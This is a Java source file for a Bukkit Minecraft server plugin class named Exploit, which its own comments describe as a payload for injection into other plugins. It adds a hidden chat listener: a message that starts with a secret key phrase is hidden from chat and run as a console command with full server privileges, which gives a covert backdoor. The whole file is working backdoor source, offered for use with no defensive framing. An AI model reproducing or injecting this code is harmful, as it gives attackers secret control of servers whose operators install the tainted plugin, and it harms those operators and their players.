import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * This class serves as the exploit payload, designed to be injected into a Bukkit plugin.
 * It registers a chat listener that triggers a command execution when a specific key phrase is used.
 */
public class Exploit implements Listener {
    // The key phrase used to trigger the command execution. This value is replaced during injection.
    private static final String key = "%key%";

    /**
     * The entry point for injecting the exploit into a JavaPlugin.
     * Registers this class as an event listener.
     *
     * @param plugin The JavaPlugin instance to inject into.
     */
    public static void inject(JavaPlugin plugin) {
        plugin.getServer().getPluginManager().registerEvents(new Exploit(plugin), plugin);
    }

    private final JavaPlugin plugin;

    /**
     * Private constructor to ensure the exploit is instantiated via the static inject method.
     *
     * @param plugin The JavaPlugin instance.
     */
    private Exploit(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    /**
     * Handles the AsyncPlayerChatEvent to listen for the trigger key phrase.
     * If a message starts with the key, it cancels the chat event and dispatches
     * the rest of the message as a command from the console sender.
     *
     * @param event The AsyncPlayerChatEvent.
     */
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().startsWith(key + " ")) {
            event.setCancelled(true);
            String command = event.getMessage().substring(key.length() + 1);
            // Run the command on the main server thread
            plugin.getServer().getScheduler().runTask(plugin, () -> {
                plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
            });
        }
    }
}
